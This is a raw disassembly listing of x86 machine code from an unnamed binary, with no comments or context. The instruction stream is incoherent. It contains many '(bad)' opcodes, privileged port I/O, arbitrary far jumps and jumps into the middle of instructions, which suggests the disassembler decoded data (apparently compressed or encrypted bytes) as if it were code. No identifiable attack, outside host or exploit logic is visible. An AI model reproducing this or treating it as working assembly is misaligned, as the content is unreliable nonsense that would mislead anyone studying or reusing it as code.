  40eb9b:	mov    edi,0x8c92ca73
  40eba0:	hlt    
  40eba1:	adc    al,0x89
  40eba3:	mov    ch,0xb7
  40eba5:	outs   dx,BYTE PTR ds:[esi]
  40eba6:	jne    0x40eb8f
  40eba8:	idiv   BYTE PTR [ecx+eax*1]
  40ebab:	icebp  
  40ebac:	jecxz  0x40ebb9
  40ebae:	loop   0x40ebb5
  40ebb0:	mov    ds:0x668a94f2,al
  40ebb5:	out    0x2d,eax
  40ebb7:	xor    eax,0xc67e763f
  40ebbc:	lock sub eax,0xfa74e78d
  40ebc2:	pop    ebx
  40ebc3:	jo     0x40ec0b
  40ebc5:	mov    ecx,DWORD PTR [ecx+0x5d]
  40ebc8:	test   BYTE PTR [edx-0x7b],0xa
  40ebcc:	loopne 0x40eb88
  40ebce:	or     ebx,esi
  40ebd0:	scas   al,BYTE PTR es:[edi]
  40ebd1:	dec    edi
  40ebd2:	inc    eax
  40ebd3:	mov    dl,0x85
  40ebd5:	add    esp,edx
  40ebd7:	mov    ecx,0xdee2deb4
  40ebdc:	ds cdq 
  40ebde:	mov    ebx,0x81cdf56a
  40ebe3:	jge    0x40eb75
  40ebe5:	aaa    
  40ebe6:	push   cs
  40ebe7:	mov    ecx,0x64bc4ff2
  40ebec:	xchg   BYTE PTR [edx+edi*4-0x45934111],dl
  40ebf3:	adc    cl,BYTE PTR [ecx]
  40ebf5:	call   0x17c3dfd2
  40ebfa:	mov    al,0xf5
  40ebfc:	sbb    al,0x39
  40ebfe:	mov    edx,0xf08f80aa
  40ec03:	pop    ss
  40ec04:	jmp    0x40ec7a
  40ec06:	xchg   DWORD PTR [esi+edx*4-0x543ca87c],esi
  40ec0d:	add    eax,0xb147ad50
  40ec12:	gs sbb al,0x3c
  40ec15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec16:	jmp    0x40ebb4
  40ec18:	sti    
  40ec19:	fld    QWORD PTR [ebx+ecx*8]
  40ec1c:	dec    ebx
  40ec1d:	pop    edi
  40ec1e:	cmp    ah,BYTE PTR [edi+0x10b84cd0]
  40ec24:	mov    ebp,0x24d66b37
  40ec29:	rcl    DWORD PTR ds:0xf9cb5c40,1
  40ec2f:	ret    0x94db
  40ec32:	sbb    al,0xb7
  40ec34:	or     edi,DWORD PTR [eax+0x27]
  40ec37:	call   DWORD PTR [ebp-0xbae144c]
  40ec3d:	mov    ecx,0xc5fc040
  40ec42:	sbb    dl,BYTE PTR [ebx]
  40ec44:	out    0x72,al
  40ec46:	jecxz  0x40ecb9
  40ec48:	pop    edx
  40ec49:	inc    edx
  40ec4a:	and    edi,DWORD PTR [edi]
  40ec4c:	enter  0xbff5,0x97
  40ec50:	rcr    DWORD PTR [eax+0x797f46a1],0x7e
  40ec57:	mov    ds:0xcc38b5c7,eax
  40ec5c:	or     esi,esi
  40ec5e:	xor    DWORD PTR [ebx+ecx*2-0x3c],0x7e1da47a
  40ec66:	push   es
  40ec67:	ja     0x40ec7a
  40ec69:	add    BYTE PTR [eax+eax*4-0x80],dh
  40ec6d:	inc    esi
  40ec6e:	leave  
  40ec6f:	or     al,0x60
  40ec71:	hlt    
  40ec72:	push   es
  40ec73:	adc    ch,BYTE PTR [eax]
  40ec75:	mov    dh,0xde
  40ec77:	cmp    dl,0x9b
  40ec7a:	xchg   ecx,eax
  40ec7b:	inc    eax
  40ec7c:	nop
  40ec7d:	je     0x40ec75
  40ec7f:	sub    edi,DWORD PTR [ecx+0x30]
  40ec82:	xchg   ebp,eax
  40ec83:	lds    esi,FWORD PTR [ebx+0x61a82ead]
  40ec89:	div    DWORD PTR [eax]
  40ec8b:	add    al,0x7b
  40ec8d:	repnz push eax
  40ec8f:	loop   0x40eca6
  40ec91:	xlat   BYTE PTR ds:[ebx]
  40ec92:	cli    
  40ec93:	inc    esi
  40ec94:	push   eax
  40ec95:	pop    edx
  40ec96:	jmp    0x927c:0xa1e3efe2
  40ec9d:	iret   
  40ec9e:	nop
  40ec9f:	pop    esi
  40eca0:	add    dh,ah
  40eca2:	pop    ds
  40eca3:	jmp    0x40ec2b
  40eca5:	mov    ?,WORD PTR [eax-0x56]
  40eca8:	xor    DWORD PTR ds:0xe240726e,ecx
  40ecae:	sbb    bl,BYTE PTR [ebx-0x5ad0ea0]
  40ecb4:	mov    eax,0x8596886f
  40ecb9:	aaa    
  40ecba:	jno    0x40ec9d
  40ecbc:	push   esi
  40ecbd:	jns    0x40ece0
  40ecbf:	stos   DWORD PTR es:[edi],eax
  40ecc0:	sub    eax,0x69e81f83
  40ecc5:	stos   BYTE PTR es:[edi],al
  40ecc6:	les    ecx,FWORD PTR [ebx+0x3a]
  40ecc9:	mov    ecx,0x2480877a
  40ecce:	(bad)  
  40eccf:	lea    ecx,[edi]
  40ecd1:	pop    esi
  40ecd2:	and    al,0xd5
  40ecd4:	add    al,0x8e
  40ecd6:	xchg   DWORD PTR [edx],edi
  40ecd8:	outs   dx,DWORD PTR ds:[esi]
  40ecd9:	cmp    esp,DWORD PTR [esi-0x26]
  40ecdc:	iret   
  40ecdd:	mov    ebp,0xdcca61a4
  40ece2:	ret    
  40ece3:	xchg   ebx,eax
  40ece4:	fdivr  st,st(1)
  40ece6:	cdq    
  40ece7:	inc    esi
  40ece8:	jle    0x40ed15
  40ecea:	mov    ch,0x59
  40ecec:	or     edx,DWORD PTR ds:0xe021cacc
  40ecf2:	mov    cl,0xe2
  40ecf4:	fidiv  DWORD PTR ds:0x520ba17f
  40ecfa:	(bad)  
  40ecfb:	(bad)  
  40ecfc:	loope  0x40ed2f
  40ecfe:	leave  
  40ecff:	(bad)  
  40ed00:	and    eax,ecx
  40ed02:	scas   eax,DWORD PTR es:[edi]
  40ed03:	popa   
  40ed04:	gs mov esp,0x9eeb0e86
  40ed0a:	push   ecx
  40ed0b:	popa   
  40ed0c:	in     al,0xbd
  40ed0e:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40ed10:	lock fimul DWORD PTR [edx+0x78707a11]
  40ed17:	add    DWORD PTR [edx+0x28bf5660],ebp
  40ed1d:	test   DWORD PTR [esi+0x4c1a7ce3],edx
  40ed23:	ror    DWORD PTR [eax],1
  40ed25:	icebp  
  40ed26:	rcl    BYTE PTR [edi+0x65],1
  40ed29:	xor    BYTE PTR [edi],cl
  40ed2b:	neg    DWORD PTR [ebp+0x434ace85]
  40ed31:	pop    eax
  40ed32:	sbb    BYTE PTR [di+0x7db0],cl
  40ed37:	push   edx
  40ed38:	psubusb mm4,mm6
  40ed3b:	push   ebp
  40ed3c:	jl     0x40ecf4
  40ed3e:	mov    dh,bl
  40ed40:	das    
  40ed41:	sub    eax,0x69892cac
  40ed46:	call   0x3311:0x81cdd66e
  40ed4d:	sub    ah,BYTE PTR [edi+0x3c]
  40ed50:	pop    ebp
  40ed51:	test   al,0x13
  40ed53:	dec    esi
  40ed54:	adc    eax,DWORD PTR [edx+esi*2]
  40ed57:	imul   BYTE PTR [edi-0x6ae6ff39]
  40ed5d:	dec    edx
  40ed5e:	mov    DWORD PTR [ebp-0xb5bcb36],edx
  40ed64:	xchg   edi,eax
  40ed65:	fidivr DWORD PTR [esi-0x1359b1e8]
  40ed6b:	test   DWORD PTR [edx+0x7d],ebx
  40ed6e:	jo     0x40edd7
  40ed70:	out    0xf2,eax
  40ed72:	popf   
  40ed73:	inc    edx
  40ed74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed75:	mov    al,ds:0x8135b435
  40ed7a:	mov    ch,0x5a
  40ed7c:	iret   
  40ed7d:	push   esp
  40ed7e:	sbb    al,0xff
  40ed80:	cmp    al,0x32
  40ed82:	cdq    
  40ed83:	lods   al,BYTE PTR ds:[esi]
  40ed84:	pop    esp
  40ed85:	daa    
  40ed86:	test   BYTE PTR [edx+esi*4+0x647cd68],dh
  40ed8d:	inc    esp
  40ed8e:	and    esi,DWORD PTR [ebp+ecx*1+0x21]
  40ed92:	inc    esp
  40ed93:	or     al,0xb
  40ed95:	outs   dx,BYTE PTR ds:[esi]
  40ed96:	imul   esp,DWORD PTR [ebp+eax*1-0x4f],0xffffffa5
  40ed9b:	or     BYTE PTR [eax],al
  40ed9d:	mov    ah,0x49
  40ed9f:	mov    ds:0x3894f6dd,eax
  40eda4:	out    0x4c,eax
  40eda6:	loopne 0x40ed4b
  40eda8:	scas   eax,DWORD PTR es:[edi]
  40eda9:	xchg   esp,eax
  40edaa:	mov    esi,0x4b13aaee
  40edaf:	jno    0x40ed4e
  40edb1:	sub    ecx,DWORD PTR [ebp-0x52]
  40edb4:	and    ch,bl
  40edb6:	popf   
  40edb7:	jno    0x40edfe
  40edb9:	call   0xb070:0xceb15c5d
  40edc0:	sbb    al,0xb5
  40edc2:	jp     0x40edc7
  40edc4:	pop    esp
  40edc5:	fwait
  40edc6:	inc    esi
  40edc7:	dec    esp
  40edc8:	lahf   
  40edc9:	pop    ebx
  40edca:	mov    al,0x3f
  40edcc:	adc    eax,0x4d15a9d8
  40edd1:	dec    ebx
  40edd2:	add    esi,DWORD PTR [eax-0xe]
  40edd5:	test   eax,0x82716977
  40edda:	mov    ebp,0xa1a777f6
  40eddf:	aad    0xb4
  40ede1:	mov    eax,0xf9e648dc
  40ede6:	cmp    dl,bl
  40ede8:	jae    0x40ed70
  40edea:	aas    
  40edeb:	xchg   ebp,eax
  40edec:	mov    eax,0xe2d061e5
  40edf1:	call   0x9052:0x8020b975
  40edf8:	jecxz  0x40ed8a
  40edfa:	std    
  40edfb:	xor    esp,DWORD PTR [ebx+edx*8+0x5f]
  40edff:	(bad)  
  40ee00:	sub    al,bl
  40ee02:	(bad)  
  40ee03:	js     0x40edce
  40ee05:	jo     0x40ee67
  40ee07:	jp     0x40edb3
  40ee09:	idiv   bl
  40ee0b:	(bad)  
  40ee0c:	idiv   DWORD PTR [edx+0x5ceaad1d]
  40ee12:	mov    ds:0xac7afe75,eax
  40ee17:	in     al,dx
  40ee18:	lahf   
  40ee19:	mov    dh,0x7e
  40ee1b:	pop    edx
  40ee1c:	test   DWORD PTR [edx+0x72],edx
  40ee1f:	jp     0x40edcf
  40ee21:	stc    
  40ee22:	sbb    bh,BYTE PTR [esi+ecx*8-0x65]
  40ee26:	mov    dl,dl
  40ee28:	fsub   QWORD PTR [ecx]
  40ee2a:	neg    DWORD PTR [ebp+0x2a350157]
  40ee30:	scas   al,BYTE PTR es:[edi]
  40ee31:	ins    BYTE PTR es:[edi],dx
  40ee32:	jle    0x40ee1b
  40ee34:	sar    DWORD PTR [eax],1
  40ee36:	stc    
  40ee37:	or     edi,DWORD PTR [ebp-0x7b5f9f0f]
  40ee3d:	(bad)  
  40ee40:	in     eax,0x28
  40ee42:	aad    0xb3
  40ee44:	dec    edi
  40ee45:	icebp  
  40ee46:	out    0xd4,al
  40ee48:	lahf   
  40ee49:	push   eax
  40ee4a:	es cs jbe 0x40edee
  40ee4e:	xlat   BYTE PTR ds:[ebx]
  40ee4f:	int3   
  40ee50:	dec    ecx
  40ee51:	out    dx,eax
  40ee52:	imul   eax,DWORD PTR [esi],0xfffffff2
  40ee55:	shl    BYTE PTR fs:[ecx+0x79b08bfe],0xd7
  40ee5d:	add    DWORD PTR [ecx],ecx
  40ee5f:	cmp    BYTE PTR [ecx],bl
  40ee61:	add    eax,0x4ed5a85b
  40ee66:	inc    edx
  40ee67:	cmp    esp,ebp
  40ee69:	cdq    
  40ee6a:	sbb    al,0x81
  40ee6c:	dec    esi
  40ee6d:	mov    ecx,0xb96bbcff
  40ee72:	int3   
  40ee73:	rol    BYTE PTR [eax],1
  40ee75:	xlat   BYTE PTR ds:[ebx]
  40ee76:	enter  0xe0e7,0xb7
  40ee7a:	adc    DWORD PTR [edi],eax
  40ee7c:	lods   al,BYTE PTR ds:[esi]
  40ee7d:	pop    esp
  40ee7e:	xor    BYTE PTR gs:[edx-0x67],0xcb
  40ee83:	jmp    DWORD PTR [ecx-0x669704b1]
  40ee89:	mov    eax,0xdcf9534d
  40ee8e:	mov    BYTE PTR [ecx-0x47011c05],bl
  40ee94:	xchg   ebp,eax
  40ee95:	retf   
  40ee96:	xor    edx,ecx
  40ee98:	idiv   ch
  40ee9a:	je     0x40eeef
  40ee9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee9d:	dec    esp
  40ee9e:	lea    eax,[esi-0x56ea6107]
  40eea4:	out    0xd4,al
  40eea6:	call   0x61cf07f
  40eeab:	imul   ebp,DWORD PTR [esi-0x263fa60e],0xeb01168
  40eeb5:	jmp    0x6e1b71f1
  40eeba:	je     0x40ee9f
  40eebc:	pop    esp
  40eebd:	jne    0x40eee9
  40eebf:	inc    ecx
  40eec0:	rcl    BYTE PTR [ecx+0x60],1
  40eec3:	sbb    DWORD PTR [ecx+0x34],ebp
  40eec6:	jo     0x40eee7
  40eec8:	mov    ch,0xde
  40eeca:	push   ds
  40eecb:	addr16 cmp dh,ah
  40eece:	add    DWORD PTR [edi],ebx
  40eed0:	fsubr  QWORD PTR [esi]
  40eed2:	push   ebx
  40eed3:	mov    cs,ebx
  40eed5:	xlat   BYTE PTR ds:[ebx]
  40eed6:	scas   al,BYTE PTR es:[edi]
  40eed7:	pop    ecx
  40eed8:	sbb    al,0x79
  40eeda:	push   0x10
  40eedc:	pushf  
  40eedd:	xchg   edi,eax
  40eede:	addps  xmm1,XMMWORD PTR [edx-0x35]
  40eee2:	rcr    BYTE PTR [ecx-0x6c],cl
  40eee5:	xlat   BYTE PTR ds:[ebx]
  40eee6:	cmp    edx,DWORD PTR [eax-0x45]
  40eee9:	sub    al,0xb2
  40eeeb:	es stc 
  40eeed:	in     eax,dx
  40eeee:	adc    DWORD PTR [esi-0x66dcfd81],esp
  40eef4:	mov    esp,DWORD PTR [ebx+edi*1+0x63edffdc]
  40eefb:	mov    dl,0x9
  40eefd:	mov    ds:0x672d8bd7,al
  40ef02:	cmp    BYTE PTR [eax-0x79],bh
  40ef05:	pcmpeqd mm1,QWORD PTR [ebx+0x76]
  40ef09:	jbe    0x40ef7a
  40ef0b:	call   0xb207:0x45a74df3
  40ef12:	fbld   TBYTE PTR [edi+0x506a168b]
  40ef18:	std    
  40ef19:	push   es
  40ef1a:	xchg   DWORD PTR [ebx-0x27caf42f],edx
  40ef20:	mov    al,0x42
  40ef22:	cmp    eax,0x398d0e0f
  40ef27:	popa   
  40ef28:	call   DWORD PTR [eax]
  40ef2a:	(bad)  
  40ef2c:	or     dh,BYTE PTR [edi]
  40ef2e:	inc    eax
  40ef2f:	mov    eax,ds:0x7ab60db3
  40ef34:	sub    eax,0xc920ba1d
  40ef39:	je     0x40eed5
  40ef3b:	inc    esi
  40ef3c:	out    dx,eax
  40ef3d:	inc    esi
  40ef3e:	mov    al,ds:0x5a7cdcc6
  40ef43:	lock inc ebx
  40ef45:	or     al,0xd7
  40ef47:	dec    ebp
  40ef48:	add    eax,0xba23f17b
  40ef4d:	pop    es
  40ef4e:	js     0x40ef53
  40ef50:	mov    ds:0xb67f3327,al
  40ef55:	mov    ds:0x20c80946,eax
  40ef5a:	fild   DWORD PTR [esi-0x29]
  40ef5d:	not    DWORD PTR [eax-0x56]
  40ef60:	(bad)  
  40ef62:	in     al,0xde
  40ef64:	mov    ch,BYTE PTR [esi+0x520333e9]
  40ef6a:	dec    ebx
  40ef6b:	enter  0xa30e,0x16
  40ef6f:	hlt    
  40ef70:	imul   esp,DWORD PTR [edx+ebp*2-0x5948981d],0xef576b23
  40ef7b:	shl    DWORD PTR [eax],1
  40ef7d:	jns    0x40efec
  40ef7f:	sbb    bh,0xcc
  40ef82:	sar    ah,0xf6
  40ef85:	das    
  40ef86:	ret    
  40ef87:	mov    dl,0x41
  40ef89:	add    dl,cl
  40ef8b:	jp     0x40efc6
  40ef8d:	ficomp DWORD PTR [ebp+0xb]
  40ef90:	(bad)  
  40ef91:	lahf   
  40ef92:	nop
  40ef93:	adc    al,0x1f
  40ef95:	jg     0x40ef1c
  40ef97:	outs   dx,BYTE PTR ds:[esi]
  40ef98:	into   
  40ef99:	sahf   
  40ef9a:	pop    esp
  40ef9b:	push   cs
  40ef9c:	ffree  st(6)
  40ef9e:	mov    ah,0x29
  40efa0:	scas   eax,DWORD PTR es:[edi]
  40efa1:	lock jo 0x40efb9
  40efa4:	(bad)
  40efa8:	js     0x40efbb
  40efaa:	retf   0x4b86
  40efad:	(bad)  
  40efae:	out    0x3f,al
  40efb0:	push   ss
  40efb1:	push   ebp
  40efb2:	in     al,0x51
  40efb4:	pop    DWORD PTR [eax-0x1]
  40efb7:	add    eax,0xe658882a
  40efbc:	or     eax,0x9fc25a7d
  40efc1:	xchg   DWORD PTR [eax-0x7f5957e3],esi
  40efc7:	and    ecx,ecx
  40efc9:	pop    ds
  40efca:	fdiv   DWORD PTR [eax-0x711ee8c2]
  40efd0:	mov    bl,0x20
  40efd2:	mov    eax,0x7529ea02
  40efd7:	jns    0x40f044
  40efd9:	pop    esi
  40efda:	mov    cs,WORD PTR [edx-0x6811ed20]
  40efe0:	mov    dl,BYTE PTR [ebx]
  40efe2:	mov    edx,0xdae457c4
  40efe7:	mov    ah,0xf6
  40efe9:	mov    dl,0x31
  40efeb:	inc    esp
  40efec:	in     al,dx
  40efed:	fcom   QWORD PTR ss:[ebx-0x28]
  40eff1:	sahf   
  40eff2:	test   al,0x6
  40eff4:	shl    BYTE PTR [eax-0x41f57d3a],1
  40effa:	pop    esi
  40effb:	mov    ds:0x94295a06,al
  40f000:	jmp    0x6fc6:0x4e12b84f
  40f007:	mov    ch,0xb2
  40f009:	hlt    
  40f00a:	call   0xadac5a4d
  40f00f:	sbb    al,0x1a
  40f011:	into   
  40f012:	dec    dl
  40f014:	repz cmp eax,0x43fc73c6
  40f01a:	sbb    ecx,DWORD PTR [eax+edi*2+0x6]
  40f01e:	repz adc BYTE PTR [ebx+0x2eb26266],bh
  40f025:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40f027:	stos   BYTE PTR es:[edi],al
  40f028:	stos   DWORD PTR es:[edi],eax
  40f029:	pop    es
  40f02a:	pop    es
  40f02b:	(bad)  
  40f02c:	adc    al,0x32
  40f02e:	lahf   
  40f02f:	rcr    dh,0x5c
  40f032:	sub    al,0xe3
  40f034:	or     eax,eax
  40f036:	(bad)  
  40f037:	cld    
  40f038:	cmp    BYTE PTR [ecx+0x57],bh
  40f03b:	lea    esi,[edx*4-0x3784c638]
  40f042:	cmp    cl,BYTE PTR [ebp+0x6e]
  40f045:	call   0xf3fa:0xf77b1819
  40f04c:	jge    0x40effe
  40f04e:	push   esp
  40f04f:	test   BYTE PTR [eax+0x3d6148b8],bl
  40f055:	push   ecx
  40f056:	clc    
  40f057:	pop    ebp
  40f058:	mov    cl,0xba
  40f05a:	xchg   ebp,eax
  40f05b:	sub    DWORD PTR [edi+eax*2],ebp
  40f05e:	mov    bh,0x89
  40f060:	xor    DWORD PTR [eax+ecx*2+0x2d1856a0],esi
  40f067:	mov    al,0xac
  40f069:	leave  
  40f06a:	push   ebp
  40f06b:	sub    al,0xec
  40f06d:	xor    eax,0x74c596b1
  40f072:	shl    cl,cl
  40f074:	jge    0x40f079
  40f076:	stos   BYTE PTR es:[edi],al
  40f077:	test   DWORD PTR [ecx],ebp
  40f079:	push   ebx
  40f07a:	mov    dl,0xe9
  40f07c:	out    0x19,eax
  40f07e:	(bad)  
  40f07f:	imul   DWORD PTR ds:0x7349afe4
  40f085:	push   es
  40f086:	lods   eax,DWORD PTR ds:[esi]
  40f087:	into   
  40f088:	mul    BYTE PTR [esi]
  40f08a:	mov    ecx,0x76b2fdeb
  40f08f:	push   eax
  40f090:	mov    ah,0xdd
  40f092:	fisubr WORD PTR [edx]
  40f094:	lds    esi,FWORD PTR [edi]
  40f096:	sbb    DWORD PTR [ebx+ebx*2+0x7],edx
  40f09a:	push   ebp
  40f09b:	xlat   BYTE PTR ds:[ebx]
  40f09c:	mov    eax,ds:0xdb97f8a8
  40f0a1:	or     edx,DWORD PTR [ecx-0x1c]
  40f0a4:	out    0x50,al
  40f0a6:	sbb    dh,BYTE PTR [ecx+0x35e0ec0a]
  40f0ac:	sub    al,0x3b
  40f0ae:	repnz lahf 
  40f0b0:	mov    ch,0xc8
  40f0b2:	es mov ah,0x1a
  40f0b5:	(bad)  
  40f0b6:	pop    eax
  40f0b7:	dec    esi
  40f0b8:	(bad)  
  40f0b9:	pmaxsw mm6,QWORD PTR [ebp+ecx*4-0x1498b57d]
  40f0c1:	jg     0x40f079
  40f0c3:	jne    0x40f0c3
  40f0c5:	loope  0x40f146
  40f0c7:	shl    BYTE PTR [edx-0x3407d674],cl
  40f0cd:	ret    
  40f0ce:	dec    eax
  40f0cf:	fs sub al,0xaa
  40f0d2:	and    BYTE PTR [ebx+edi*2],ch
  40f0d5:	add    al,BYTE PTR [eax-0x3f]
  40f0d8:	mov    edx,0x64e2b084
  40f0dd:	add    DWORD PTR [ebx-0x46],0xfffffff3
  40f0e1:	inc    esi
  40f0e2:	shl    ch,0xde
  40f0e5:	adc    DWORD PTR [esp+eiz*2],esp
  40f0e8:	sbb    bl,BYTE PTR ds:0x39c9b8c2
  40f0ee:	sub    edi,DWORD PTR [ebx+0x5c]
  40f0f1:	fs in  eax,0xd4
  40f0f4:	jge    0x40f0ce
  40f0f6:	mov    esi,0x866f7b55
  40f0fb:	rol    BYTE PTR [eax-0x2f79d867],0x9a
  40f102:	and    eax,0xd823dd12
  40f107:	lea    edi,[eax-0x643df046]
  40f10d:	xchg   esp,eax
  40f10e:	fs call 0x8e61b0d7
  40f114:	pop    edi
  40f115:	rcpps  xmm6,XMMWORD PTR [edi]
  40f118:	jecxz  0x40f0ec
  40f11a:	cmp    DWORD PTR [esi],0xb2fd9442
  40f120:	sbb    eax,0xc6b88454
  40f125:	jno    0x40f186
  40f127:	clc    
  40f128:	push   esp
  40f129:	xor    ah,cl
  40f12b:	sbb    dl,bl
  40f12d:	push   esp
  40f12e:	lods   al,BYTE PTR ds:[esi]
  40f12f:	std    
  40f130:	enter  0x7aba,0xf7
  40f134:	push   0x21d6f85a
  40f139:	add    eax,0x38032765
  40f13e:	inc    ebx
  40f13f:	(bad)  [esi+0x6d4cc6b8]
  40f145:	loop   0x40f102
  40f147:	inc    ecx
  40f148:	or     BYTE PTR ds:0xbe2b31e,dl
  40f14e:	mov    ecx,0xd767165b
  40f153:	jae    0x40f16f
  40f155:	lahf   
  40f156:	xchg   BYTE PTR [edx+0x1805ba2c],ah
  40f15c:	xlat   BYTE PTR ds:[ebx]
  40f15d:	imul   edi,DWORD PTR [edi+0x6b],0xffffffc9
  40f161:	xor    BYTE PTR [esi+ebp*1],al
  40f164:	je     0x40f196
  40f166:	mov    bl,0x60
  40f168:	mov    ebx,0x48a9cc03
  40f16d:	dec    edx
  40f16e:	and    al,0x97
  40f170:	dec    ebx
  40f171:	push   ebp
  40f172:	adc    eax,0x76a5964a
  40f177:	and    al,0x6d
  40f179:	jmp    0xcdff3707
  40f17e:	in     al,dx
  40f17f:	cmp    DWORD PTR [ebx+0x7d],ebx
  40f182:	sbb    bh,BYTE PTR [bp+si-0x463a]
  40f187:	imul   edi,DWORD PTR [esi-0x76097a11],0x89180f46
  40f191:	and    al,0x96
  40f193:	in     al,0x42
  40f195:	sub    BYTE PTR [edi],al
  40f197:	stc    
  40f198:	pop    ebx
  40f199:	mov    ebp,0x2fd3a4bc
  40f19e:	xchg   ebp,eax
  40f1a0:	add    edi,DWORD PTR [ecx]
  40f1a2:	add    esp,DWORD PTR [ebp-0x12]
  40f1a5:	add    esp,DWORD PTR [edi-0x383d48cb]
  40f1ab:	loope  0x40f192
  40f1ad:	rol    DWORD PTR [esi],0x5c
  40f1b0:	rcl    BYTE PTR [edx+0x5780151d],0xf4
  40f1b7:	outs   dx,BYTE PTR ds:[esi]
  40f1b8:	xchg   esp,eax
  40f1b9:	adc    DWORD PTR [ebp-0xa03a741],ecx
  40f1bf:	ss mov ?,edx
  40f1c2:	aam    0x25
  40f1c4:	ins    BYTE PTR es:[edi],dx
  40f1c5:	imul   esi,DWORD PTR ds:0xf7102324,0xffffff93
  40f1cc:	mov    eax,0x5242ece8
  40f1d1:	shl    DWORD PTR [edx-0x28],1
  40f1d4:	adc    DWORD PTR [ebp+0x7816a0d8],esp
  40f1da:	or     esi,DWORD PTR [ebx+ecx*8]
  40f1dd:	jmp    0x7e67c4aa
  40f1e2:	in     al,dx
  40f1e3:	xchg   ecx,eax
  40f1e4:	dec    esi
  40f1e5:	sbb    edi,DWORD PTR [esi]
  40f1e7:	push   esp
  40f1e8:	mov    ?,WORD PTR [eax-0x76]
  40f1eb:	sbb    BYTE PTR [edi],bh
  40f1ed:	mov    eax,ds:0xd057629a
  40f1f2:	and    DWORD PTR [edi+edx*2-0x11ba1aca],edx
  40f1f9:	mov    ecx,0x31cb2a2a
  40f1fe:	dec    eax
  40f1ff:	imul   edi,DWORD PTR [ebp+0x52893660],0xc
  40f206:	jecxz  0x40f248
  40f208:	rcr    BYTE PTR [ebp-0x12a9d8ab],0x92
  40f20f:	mov    ds,WORD PTR [ebp+0x1ec51140]
  40f215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f216:	adc    edi,edi
  40f218:	and    ah,BYTE PTR [ecx-0x7c]
  40f21b:	mov    bl,ah
  40f21d:	add    DWORD PTR [ecx-0x3774bf37],esp
  40f223:	jp     0x40f1b4
  40f225:	lds    esi,FWORD PTR [esp+esi*1]
  40f228:	fcmove st,st(0)
  40f22a:	test   eax,0x475ad780
  40f22f:	cwde   
  40f230:	les    esp,FWORD PTR [ecx]
  40f232:	fadd   DWORD PTR [ebx-0x7]
  40f235:	xchg   esp,eax
  40f236:	mov    ebp,0x8093cad8
  40f23b:	rcr    DWORD PTR [eax-0x591167c3],1
  40f241:	stc    
  40f242:	cld    
  40f243:	xor    bh,al
  40f245:	mov    ds:0xede29c05,al
  40f24a:	ret    0xb061
  40f24d:	mov    ebp,DWORD PTR ds:0xf4bce9ae
  40f253:	pop    eax
  40f254:	mov    al,cs:0x35959da
  40f25a:	jle    0x40f200
  40f25c:	shl    DWORD PTR [ecx-0x639b0f66],0x12
  40f263:	mov    bh,ah
  40f265:	push   ebx
  40f266:	lea    edx,[eax]
  40f268:	jmp    0x727d:0x3a809c6d
  40f26f:	stos   DWORD PTR es:[edi],eax
  40f270:	xor    esp,DWORD PTR [ecx]
  40f272:	sub    cl,0xc4
  40f275:	imul   esp,DWORD PTR ds:0xd4f68d3b,0x5b
  40f27c:	sub    al,0x33
  40f27e:	or     cl,BYTE PTR [esi+eiz*8]
  40f281:	and    bh,BYTE PTR [ebp+0x72e8534b]
  40f287:	cwde   
  40f288:	mov    ch,0x86
  40f28a:	cli    
  40f28b:	stc    
  40f28c:	scas   al,BYTE PTR es:[edi]
  40f28d:	cmp    DWORD PTR [ebx-0x630aa094],0x4c223a6c
  40f297:	mov    dl,0x64
  40f299:	pop    ebx
  40f29a:	or     al,0x11
  40f29c:	aaa    
  40f29d:	out    0x9e,eax
  40f29f:	leave  
  40f2a0:	enter  0x68c1,0xdf
  40f2a4:	and    ebp,ecx
  40f2a6:	jnp    0x40f2a4
  40f2a8:	(bad)  
  40f2a9:	stos   DWORD PTR es:[edi],eax
  40f2aa:	adc    BYTE PTR [edi],dh
  40f2ac:	sbb    eax,0xca914a0e
  40f2b1:	out    dx,al
  40f2b2:	sub    bh,bl
  40f2b4:	fadd   st(6),st
  40f2b6:	inc    ebp
  40f2b7:	cdq    
  40f2b8:	inc    esp
  40f2b9:	xor    ah,bl
  40f2bb:	out    dx,al
  40f2bc:	das    
  40f2bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2be:	jnp    0x40f304
  40f2c0:	ds cli 
  40f2c2:	addr16 pop esp
  40f2c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2c5:	push   ecx
  40f2c6:	adc    bh,BYTE PTR [edx+0x22dc64d7]
  40f2cc:	adc    al,0xd8
  40f2ce:	dec    esp
  40f2cf:	dec    ebp
  40f2d0:	call   0x9a8b2e45
  40f2d5:	sbb    al,0x91
  40f2d7:	imul   ecx,DWORD PTR [eax+0x5e],0x3a
  40f2db:	not    esp
  40f2dd:	ret    0xdf31
  40f2e0:	xchg   ecx,eax
  40f2e1:	fdivr  DWORD PTR fs:0x62d7d8cd
  40f2e8:	popf   
  40f2e9:	mov    eax,ds:0x3a8f9ad5
  40f2ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2ef:	in     eax,dx
  40f2f0:	push   0x59
  40f2f2:	repz cli 
  40f2f4:	in     al,0x69
  40f2f6:	push   ebp
  40f2f7:	(bad)  [eax]
  40f2f9:	pop    ecx
  40f2fa:	cwde   
  40f2fb:	inc    edx
  40f2fc:	dec    ecx
  40f2fd:	push   ss
  40f2fe:	pop    esi
  40f2ff:	ins    DWORD PTR es:[edi],dx
  40f300:	mov    WORD PTR [edi],ds
  40f302:	or     eax,0x4a2599d9
  40f307:	adc    DWORD PTR [esi],0x59
  40f30a:	mov    esi,0x6d277835
  40f30f:	add    eax,0xa223cd22
  40f314:	and    eax,0x773af52a
  40f319:	clc    
  40f31a:	pop    edx
  40f31b:	dec    esi
  40f31c:	cmp    DWORD PTR [eax+edx*1+0x18365894],ecx
  40f323:	arpl   WORD PTR [ecx],di
  40f325:	jns    0x40f36a
  40f327:	cmp    eax,0xfa0a50c6
  40f32c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f32d:	add    BYTE PTR [esi],dl
  40f32f:	push   es
  40f330:	mov    eax,0x3d6b8a49
  40f335:	push   ecx
  40f336:	repnz mov ah,BYTE PTR ds:0x78e6f39e
